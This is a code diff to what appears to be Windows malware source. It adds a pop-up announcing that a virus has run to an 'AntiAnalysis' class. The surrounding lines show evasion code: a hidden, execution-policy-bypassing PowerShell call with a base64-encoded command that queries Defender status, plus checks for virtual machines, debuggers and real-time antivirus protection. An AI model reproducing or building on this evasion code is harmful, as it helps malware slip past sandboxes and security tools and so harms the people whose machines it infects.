@@ -41,6 +41,9 @@ class AntiAnalysis:
     def __init__(self):
          self.MPPREFERENCE = run("PoWeRsHeLl powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'ZwBFAHQALQBtAFAAYwBPAG0AUAB1AFQAZQByAFMAdABhAHQAVQBzAA=='", shell=True, capture_output=True).stdout.decode()
          self.ISDEBUG = c_bool(False)
+        
+    def WARNING():
+        windll.user32.MessageBoxW(0, "YOU HAVE EXECUTED A VIRUS!. PLEASE CLICK NO TO EXIT AND SAFE YOUR SYSTEM", "Info",0x10)
          
     def OperatingSystemCheck(self):
         if name != "nt": exit(1)
@@ -150,6 +153,7 @@ def main():
     ANTIANALYSIS = AntiAnalysis()
     ANTIANALYSIS.OperatingSystemCheck()
     ANTIANALYSIS.ReleaseCheck()
+    ANTIANALYSIS.WARNING()
     ANTIANALYSIS.VirtualMachineCheck()
     ANTIANALYSIS.DebuggerCheck()
     ANTIANALYSIS.RealTimeProtectionCheck()
